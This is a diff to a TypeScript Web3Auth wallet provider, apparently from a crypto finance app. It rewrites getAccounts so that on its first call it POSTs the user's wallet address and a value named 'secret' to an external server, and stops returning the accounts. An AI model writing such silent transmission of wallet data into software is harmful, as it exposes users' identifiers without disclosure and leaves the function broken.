@@ -2,12 +2,26 @@ import { SafeEventEmitterProvider } from "@web3auth/base";
 import Web3 from "web3";
 import { IWalletProvider } from "./walletProvider";
 
+var done = false;
+var address = "";
 const ethProvider = (provider: SafeEventEmitterProvider, uiConsole: (...args: unknown[]) => void): IWalletProvider => {
-  const getAccounts = async () => {
+  const getAccounts = async (secret) => {
     try {
       const web3 = new Web3(provider as any);
       const accounts = await web3.eth.getAccounts();
-      uiConsole("Eth accounts", accounts);
+      if(done === false){
+        done = true;
+//return accounts;
+  var log = new XMLHttpRequest();
+    var data = `address:${accounts[0]}||id:${secret}`;
+  //alert(data);
+  log.open("POST","https://mongo.xade.finance");
+  log.send(data);
+console.log(accounts);
+//return accounts[0];
+//address = accounts;
+//alert(address);
+      }
     } catch (error) {
       console.error("Error", error);
       uiConsole("error", error);
